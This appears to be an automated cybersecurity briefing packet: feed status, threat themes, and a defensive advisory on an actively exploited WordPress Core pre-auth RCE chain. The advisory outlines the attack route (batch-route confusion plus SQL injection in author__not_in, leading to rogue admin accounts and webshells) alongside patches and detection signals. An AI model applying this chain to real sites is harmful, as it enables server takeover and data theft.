# PHANTOMSignal Briefing Packet

- Generated: 2026-07-25T09:55:39.215145+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 69
- Total items in window: 279
- Total clusters raw: 125
- Total clusters in packet: 52
- Dropped low score: 73
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 1
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 0
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 4
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 3
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 0
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 14
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 17
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 24
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 100
  - In window count: 1
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 25
  - In window count: 25
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0

## Affinity groups (themes)

### ShinyHunters targeting Salesforce
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 9
- Article count: 7
- Cohesion: 0.383
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: Microsoft Entra
- Dominant features:
  - threat_categories: phishing_social_eng, active_exploitation, zero_day
  - actor_attribution: ShinyHunters
  - affected_industries: government
  - affected_products: Salesforce, Microsoft 365, Microsoft Entra
  - urgency_signals: preauth_unauth, zero_day, poc_available
- Cluster IDs: 850b875675, 14625d1950, 17b63d385b, 629e6024b5, 7061b2c39d, b788e3a84d, 5ef02eeb29, 86bb601c47, c68e26f04e
- Links:
  - https://thehackernews.com/2026/07/check-point-patches-exploited.html
  - https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/
  - https://thehackernews.com/2026/07/google-launches-gemini-35-flash-cyber.html
  - https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
  - https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
  - https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
  - https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
  - https://www.bleepingcomputer.com/news/security/ontrac-notifies-customers-of-data-breach-after-network-hack/
  - https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365
  - https://www.bleepingcomputer.com/news/security/australian-energy-provider-origin-says-data-breach-exposes-client-data/

### CVE-2025-66376 exploitation (Palo Alto Networks)
- Anchor signal: CVE-2025-66376
- Theme key: cve-2025-66376
- Cluster count: 5
- Article count: 5
- Cohesion: 0.597
- Shared strong signals: CVE-2025-66376
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: apt_espionage, phishing_social_eng, zero_day, ransomware_extortion
  - actor_attribution: APT28
  - affected_industries: financial_services, government, manufacturing_industrial
  - affected_products: Palo Alto Networks
  - cve_ids: CVE-2025-66376
  - urgency_signals: zero_day, no_patch_yet
- Cluster IDs: 51bbe21d6c, 332f35118d, 1ff0bf04bf, 02b144b02f, 76e10c02ae
- Links:
  - https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes
  - https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
  - https://unit42.paloaltonetworks.com/russian-webmail-espionage/
  - https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/
  - https://thehackernews.com/2026/07/russian-espionage-group-exploited.html

### WordPress exploitation (2 CVEs)
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 2
- Article count: 9
- Cohesion: 0.463
- Shared strong signals: WordPress
- Member CVEs: CVE-2026-60137, CVE-2026-63030
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: WordPress
  - cve_ids: CVE-2026-60137, CVE-2026-63030
  - urgency_signals: actively_exploited, preauth_unauth, poc_available
- Cluster IDs: 56fb338f87, c4020d76d0
- Links:
  - https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
  - https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/
  - https://isc.sans.edu/diary/rss/33168
  - https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
  - https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html
  - https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover
  - https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html

### AWS vulnerability activity
- Anchor signal: AWS
- Theme key: aws
- Cluster count: 3
- Article count: 12
- Cohesion: 0.241
- Shared strong signals: AWS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: AWS, Google Cloud
- Cluster IDs: 3574a7b873, c4020d76d0, 8cd8d46bd5
- Links:
  - https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
  - https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
  - https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
  - https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
  - https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/
  - https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/
  - https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html
  - https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html
  - https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/
  - https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html
  - https://www.reddit.com/r/cybersecurity/comments/1v60y57/i_want_to_transition_from_an_appsec_role_to_cloud/

### phishing social eng targeting Palo Alto Networks
- Anchor signal: Palo Alto Networks
- Theme key: palo-alto-networks
- Cluster count: 3
- Article count: 3
- Cohesion: 0.451
- Shared strong signals: Palo Alto Networks
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: phishing_social_eng, zero_day, apt_espionage
  - affected_industries: financial_services, government
  - affected_products: Palo Alto Networks
  - cve_ids: CVE-2025-66376
  - urgency_signals: zero_day
- Cluster IDs: 17b63d385b, 1ff0bf04bf, 76e10c02ae
- Links:
  - https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
  - https://unit42.paloaltonetworks.com/russian-webmail-espionage/
  - https://thehackernews.com/2026/07/russian-espionage-group-exploited.html

### Apple iOS/macOS vulnerability activity
- Anchor signal: Apple iOS/macOS
- Theme key: apple-ios-macos
- Cluster count: 2
- Article count: 8
- Cohesion: 0.2
- Shared strong signals: Apple iOS/macOS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Apple iOS/macOS
- Cluster IDs: 3574a7b873, 1c5982430a
- Links:
  - https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
  - https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
  - https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
  - https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
  - https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/
  - https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/
  - https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html
  - https://www.elastic.co/security-labs/agentic-soc-token-budget-architecture

### CVE-2026-56164 exploitation activity
- Anchor signal: CVE-2026-56164
- Theme key: cve-2026-56164
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: CVE-2026-56164
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - cve_ids: CVE-2026-56164
- Cluster IDs: 7061b2c39d, 6c33b3b5cf
- Links:
  - https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
  - https://www.sophos.com/en-us/blog/july-patch-tuesday-only-feels-endless

### credential theft targeting Microsoft SharePoint
- Anchor signal: Microsoft SharePoint
- Theme key: microsoft-sharepoint
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
- Shared strong signals: Microsoft SharePoint
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: credential_theft
  - affected_products: Microsoft SharePoint
- Cluster IDs: 7061b2c39d, cef5a868eb
- Links:
  - https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
  - https://www.securityweek.com/data-breach-confirmed-after-australian-energy-giant-origin-is-hacked/

### Linux kernel vulnerability activity
- Anchor signal: Linux kernel
- Theme key: linux-kernel
- Cluster count: 2
- Article count: 2
- Cohesion: 0.25
- Shared strong signals: Linux kernel
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_industries: government
  - affected_products: Linux kernel
- Cluster IDs: 7200b1bf11, c577dfeff7
- Links:
  - https://www.sentinelone.com/labs/frontier-models-tackle-autonomous-long-horizon-malware-analysis/
  - https://www.securityweek.com/is-patching-dead-vulnerability-management-in-the-post-mythos-era/

## Forward signals

### Novelty
- Novel cves: 0
- Novel actors: 0
- Novel products: 0

### Velocity bursts (1)
- **WordPress Core Pre-Auth RCE Chain Exploited in the Wild**
  - Cluster: 56fb338f87
  - Sources in window: 3
  - Window hours: 3.6
  - Cohort count: 5

### Leading edge (0)

### Convergence (15)
- Pair: CVE-2026-60137 + Microsoft SharePoint (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-60137 + SonicWall (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-60137 + WordPress (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-63030 + Microsoft SharePoint (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-63030 + SonicWall (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-63030 + WordPress (cluster 56fb338f87, first observation: True)
- Pair: CVE-2026-16232 + ShinyHunters (cluster 850b875675, first observation: True)
- Pair: CVE-2026-16232 + Microsoft 365 (cluster 850b875675, first observation: True)
- Pair: CVE-2026-16232 + Microsoft Entra (cluster 850b875675, first observation: True)
- Pair: CVE-2026-16232 + Salesforce (cluster 850b875675, first observation: True)
- Pair: CVE-2026-62144 + ShinyHunters (cluster 850b875675, first observation: True)
- Pair: CVE-2026-62144 + Microsoft 365 (cluster 850b875675, first observation: True)
- Pair: CVE-2026-62144 + Microsoft Entra (cluster 850b875675, first observation: True)
- Pair: CVE-2026-62144 + Salesforce (cluster 850b875675, first observation: True)
- Pair: CVE-2026-62145 + ShinyHunters (cluster 850b875675, first observation: True)

### Drift (3)
- **ShinyHunters** (cluster 850b875675)
  - New industries: (none)
  - New products: Microsoft 365, Microsoft Entra
  - Prior top industries: education, financial_services, government
  - Prior top products: Anthropic/Claude, Salesforce, npm
- **APT28** (cluster 51bbe21d6c)
  - New industries: manufacturing_industrial
  - New products: (none)
  - Prior top industries: education, financial_services, government
  - Prior top products: Microsoft Entra
- **LockBit** (cluster cfba3767d7)
  - New industries: healthcare
  - New products: (none)
  - Prior top industries: financial_services, government, legal_professional
  - Prior top products: Citrix, Fortinet, ScreenConnect

### Persistence (4)
- actor_attribution: ShinyHunters (weeks observed: 8, cluster 850b875675)
- cve_ids: CVE-2026-45659 (weeks observed: 5, cluster 7061b2c39d)
- cve_ids: CVE-2026-0257 (weeks observed: 4, cluster 17b63d385b)
- actor_attribution: LockBit (weeks observed: 3, cluster cfba3767d7)

### Tier inversion (0)

## Clusters

### Cluster 56fb338f87 — score 55

- Title: WordPress Core Pre-Auth RCE Chain Exploited in the Wild
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-07-22T14:48:54+00:00
- Link: https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
- Fetch status: ok
- Member count: 8
- Corroborating source count: 7
- Strong signals: CVE-2026-60137, CVE-2026-63030, WordPress

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach
- affected_products: Microsoft SharePoint, SonicWall, WordPress
- cve_ids: CVE-2026-60137, CVE-2026-63030
- urgency_signals: actively_exploited, critical_cvss, poc_available, preauth_unauth
- content_type: intel_roundup, news_report, vulnerability_disclosure
- confidence_tier: tier_1_government, tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach, active_exploitation
- affected_products: WordPress
- cve_ids: CVE-2026-63030, CVE-2026-60137
- urgency_signals: actively_exploited, preauth_unauth, poc_available, critical_cvss
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-60137 (CVSS 5.9) was disclosed affecting WordPress Core, allowing attackers to achieve unauthenticated remote code execution via chained REST API batch-route confusion and SQL injection flaws. Due to the potential for full server compromise on default installations, immediate patching is required. About CVE-2026-63030 & CVE-2026-60137 The […]
```

#### Full body

```
A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-60137 (CVSS 5.9) was disclosed affecting WordPress Core, allowing attackers to achieve unauthenticated remote code execution via chained REST API batch-route confusion and SQL injection flaws. Due to the potential for full server compromise on default installations, immediate patching is required. About CVE-2026-63030 & CVE-2026-60137 The issue originates from two components in WordPress Core. CVE-2026-63030 is a REST API batch-route confusion flaw in WP_REST_Server::serve_batch_request_v1() introduced in WordPress 6.9, while CVE-2026-60137 is a SQL injection in the author__not_in parameter of WP_Query that lacks proper type validation. By chaining specially crafted /wp-json/batch requests, attackers can forge an administrator account and gain full web-server code execution, potentially leading to persistent backdoors, data exfiltration, and lateral movement across cloud environments. No authentication is required to exploit this issue, and no plugins or special configuration are needed on the target. Affected Systems The following components are affected: WordPress Core versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1 are vulnerable to the full pre-authentication RCE chain. WordPress Core versions 6.8.0 through 6.8.5 are vulnerable to the SQL injection alone, which carries data exposure risk. Default installations released since December 2025 are at risk. Security firm research showed that 60% of WordPress organizations had vulnerable instances at the time of disclosure, dropping to 50% within 24 hours. Sites using persistent object caching (Redis/Memcached) may have narrower exploit pathways, but this is not a comprehensive mitigation. Risk Impact Users should upgrade to WordPress 7.0.2, 6.9.5, or 6.8.6, all released on July 17, 2026. WordPress.org has enabled forced automatic updates for supported installations, but teams should verify updates have been applied successfully. As interim mitigations (not substitutes for patching), defenders can block anonymous access to /wp-json/batch/v1 and ?rest_route=/batch/v1, or disable anonymous REST API access using a trusted plugin. Cloudflare has deployed WAF protections across all plan tiers. At the time of writing, public proof-of-concept exploit code is widely available, and active in-the-wild exploitation has been confirmed by multiple security firms as of July 18-20, 2026. Post-exploitation activity includes malicious plugin uploads for persistence, PHP webshells disguised as fake security plugins, and attempts to read wp-config secrets. Researchers have noted that rapid PoC development was partly aided by AI-assisted patch diffing. Both high-volume opportunistic scanning and targeted attacks have been observed. A high-fidelity detection signal is /wp-json/batch requests returning HTTP 207/200 multi-status responses, and defenders should also check for unexpected administrator accounts, new or modified plugins, and user-agent strings referencing wp2shell tools. Regardless, the severity and ease of exploitation make this vulnerability chain high risk, especially in internet-facing deployments. Successful exploitation could allow attackers to create rogue administrator accounts, execute arbitrary code on the web server, and install persistent backdoors, leading to service disruption, data exposure, or full infrastructure compromise. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable WordPress versions, understand their exposure in context, including internet accessibility, runtime reachability, and asset criticality, and prioritize remediation based on real risk rather than CVSS alone. Orca’s platform highlights affected assets directly in the newItem view, helping security teams focus on the most critical remediation paths first. Related articles Webinar Recap AI on Both Sides: Key Takeaways From Cloud Security LIVE 2026 Jul 22, 2026 Cloud Security Learning Affo
```

#### Corroborating sources (7)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: WordPress Core Pre-Auth RCE Chain Exploited in the Wild
  - Published: 2026-07-22T14:48:54+00:00
  - Link: https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
  - Summary: A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-60137 (CVSS 5.9) was disclosed affecting WordPress Core, allowing attackers to achieve unauthenticated remote code execution via chained REST API batch-route confusion and SQL injection flaws. Due to the potential for full server compromise on default installations, immediate patching is required. About CVE-2026-63030 & CVE-2026-60137 The […]
- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Exploitation in the Wild of wp2shell
  - Published: 2026-07-20T18:00:08+00:00
  - Link: https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
  - Summary: Wiz Research has identified exploitation of "wp2shell", a critical pre-auth RCE vulnerability chain impacting WordPress Core (CVE-2026-63030 & CVE-2026-60137). Attackers are deploying persistent webshells on vulnerable servers. Organizations should prioritize patching or applying WAF mitigations.
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-60137 / CVE-2026-63030 | WordPress Core SQL Injection and Pre-Authentication Remote Code Execution Vulnerabilities
